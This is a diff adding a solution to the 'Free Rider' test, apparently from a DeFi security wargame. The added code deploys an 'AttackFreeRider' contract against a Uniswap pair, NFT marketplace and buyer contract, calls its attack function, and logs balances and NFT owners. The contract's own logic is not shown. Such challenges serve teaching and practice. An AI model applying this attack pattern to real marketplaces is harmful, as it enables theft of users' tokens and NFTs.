@@ -105,6 +105,111 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        console.log('<<<<<<<< Deploy Attack Contract >>>>>>>>');
+
+        console.log('= deploying attack contract =');
+        const attackContract = await (await ethers.getContractFactory('AttackFreeRider', attacker)).deploy(this.uniswapPair.address, this.marketplace.address, this.weth.address, this.nft.address, this.buyerContract.address);
+        console.log('= done deploying attack contract =');
+
+        console.log('- BALANCES -');  
+        attackerEthBal = await ethers.provider.getBalance(attacker.address);
+        attackerWethBal = await this.weth.balanceOf(attacker.address);
+        console.log('- attacker -');
+        console.log('eth');
+        console.log(attackerEthBal.toString());
+        console.log('weth');
+        console.log(attackerWethBal.toString());
+
+        attackContractEthBal = await ethers.provider.getBalance(attackContract.address);
+        attackContractWethBal = await this.weth.balanceOf(attackContract.address);
+        console.log('- attack contract -');
+        console.log('eth');
+        console.log(attackContractEthBal.toString());
+        console.log('weth');
+        console.log(attackContractWethBal.toString());
+
+        marketplaceEthBal = await ethers.provider.getBalance(this.marketplace.address);
+        marketplaceWethBal = await this.weth.balanceOf(this.marketplace.address);
+        console.log('- marketplace -');
+        console.log('eth');
+        console.log(marketplaceEthBal.toString());
+        console.log('weth');
+        console.log(marketplaceWethBal.toString());
+
+        console.log('<<<<<<<< Approve Attack Contract To Move WETH >>>>>>>>');
+
+        console.log('= approve attack contract to move WETH =');
+        await this.weth.approve(
+            attackContract.address,
+            ethers.utils.parseEther('1000')
+        );
+
+        console.log('<<<<<<<< Transfer 0.1 Eth for uniswap fee >>>>>>>>');
+        await attacker.sendTransaction({to: attackContract.address, value: ethers.utils.parseEther('0.1')});
+
+        console.log('- BALANCES -');  
+        attackerEthBal = await ethers.provider.getBalance(attacker.address);
+        attackerWethBal = await this.weth.balanceOf(attacker.address);
+        console.log('- attacker -');
+        console.log('eth');
+        console.log(attackerEthBal.toString());
+        console.log('weth');
+        console.log(attackerWethBal.toString());
+
+        attackContractEthBal = await ethers.provider.getBalance(attackContract.address);
+        attackContractWethBal = await this.weth.balanceOf(attackContract.address);
+        console.log('- attack contract -');
+        console.log('eth');
+        console.log(attackContractEthBal.toString());
+        console.log('weth');
+        console.log(attackContractWethBal.toString());
+
+        marketplaceEthBal = await ethers.provider.getBalance(this.marketplace.address);
+        marketplaceWethBal = await this.weth.balanceOf(this.marketplace.address);
+        console.log('- marketplace -');
+        console.log('eth');
+        console.log(marketplaceEthBal.toString());
+        console.log('weth');
+        console.log(marketplaceWethBal.toString());
+
+        console.log('<<<<<<<< Attack >>>>>>>>');
+        await attackContract.connect(attacker).attack();
+        
+        console.log('- BALANCES -');  
+        attackerEthBal = await ethers.provider.getBalance(attacker.address);
+        attackerWethBal = await this.weth.balanceOf(attacker.address);
+        console.log('- attacker -');
+        console.log('eth');
+        console.log(attackerEthBal.toString());
+        console.log('weth');
+        console.log(attackerWethBal.toString());
+
+        attackContractEthBal = await ethers.provider.getBalance(attackContract.address);
+        attackContractWethBal = await this.weth.balanceOf(attackContract.address);
+        console.log('- attack contract -');
+        console.log('eth');
+        console.log(attackContractEthBal.toString());
+        console.log('weth');
+        console.log(attackContractWethBal.toString());
+
+        marketplaceEthBal = await ethers.provider.getBalance(this.marketplace.address);
+        marketplaceWethBal = await this.weth.balanceOf(this.marketplace.address);
+        console.log('- marketplace -');
+        console.log('eth');
+        console.log(marketplaceEthBal.toString());
+        console.log('weth');
+        console.log(marketplaceWethBal.toString());
+
+        console.log('- OWNERS -');  
+        console.log('attacker', attacker.address);  
+        console.log('buyer contract', this.buyerContract.address);
+        console.log('owner 0', await this.nft.ownerOf(0));
+        console.log('owner 1', await this.nft.ownerOf(1));
+        console.log('owner 2', await this.nft.ownerOf(2));
+        console.log('owner 3', await this.nft.ownerOf(3));
+        console.log('owner 4', await this.nft.ownerOf(4));
+        console.log('owner 5', await this.nft.ownerOf(5));
     });
 
     after(async function () {
